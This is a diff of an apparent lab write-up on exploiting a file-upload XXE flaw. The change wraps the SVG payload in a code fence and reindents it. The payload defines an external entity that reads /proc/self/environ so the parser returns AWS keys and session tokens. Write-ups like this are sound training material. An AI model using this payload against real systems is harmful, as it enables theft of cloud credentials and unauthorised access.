@@ -17,13 +17,15 @@ https://huge-logistics-dump.s3.us-west-1.amazonaws.com/uploads/file_XsbYgmXZ5n.p
 To exploit the XXE vulnerability, we need to inject a reference to an external entity into an XML document. This will cause the XML parser to read from a local file, such as /proc/self/environ, which contains environment variables that could include sensitive AWS credentials.
 
 The XML payload can be constructed as follows:
+```xml
 <?xml version="1.0" encoding="UTF-8" standalone="no"?>
 <!DOCTYPE replace [
-    <!ENTITY xxe SYSTEM 'file:///proc/self/environ'>
+<!ENTITY xxe SYSTEM 'file:///proc/self/environ'>
 ]>
 <svg>
-    <text>&xxe;</text>
+  <text>&xxe;</text>
 </svg>
+
 ![Schermata XXE](https://github.com/jacopo1223/jacopo.github/blob/main/File%20Upload%20XXE%20to%20Initial%20Access/write%20up4.png)
 This code injects the contents of /proc/self/environ (which includes environment variables) into an SVG document. The XXE vulnerability allows you to extract sensitive information, such as AWS access keys, session tokens and other environment variables.
 
